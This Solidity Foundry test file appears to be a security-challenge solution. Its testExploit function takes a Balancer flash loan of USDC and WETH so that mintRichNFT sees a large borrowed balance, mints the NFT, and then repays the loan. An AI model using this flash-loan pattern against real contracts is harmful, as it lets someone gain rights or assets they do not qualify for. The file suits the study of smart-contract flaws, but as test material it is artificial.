// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {RichNFTBaseTest} from "./RichNFTBase.t.sol";

import "../../src/interface.sol";

interface IVault {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

contract RichNFTTest is RichNFTBaseTest {
    IVault private vault = IVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    function testExploit() public validation {
        IERC20[] memory tokens = new IERC20[](2);
        tokens[0] = IERC20(usdc);
        tokens[1] = IERC20(weth);

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 10000 * 1e6;
        amounts[1] = 10000 * 1e18;

        vault.flashLoan(IFlashLoanRecipient(address(this)), tokens, amounts, "");
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        require(msg.sender == address(vault), "Only Balancer Vault can call this function");
        
        nft.mintRichNFT();

        IERC20(weth).transfer(address(vault), IERC20(weth).balanceOf(address(this)));
        IERC20(usdc).transfer(address(vault), IERC20(usdc).balanceOf(address(this)));
    }

    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
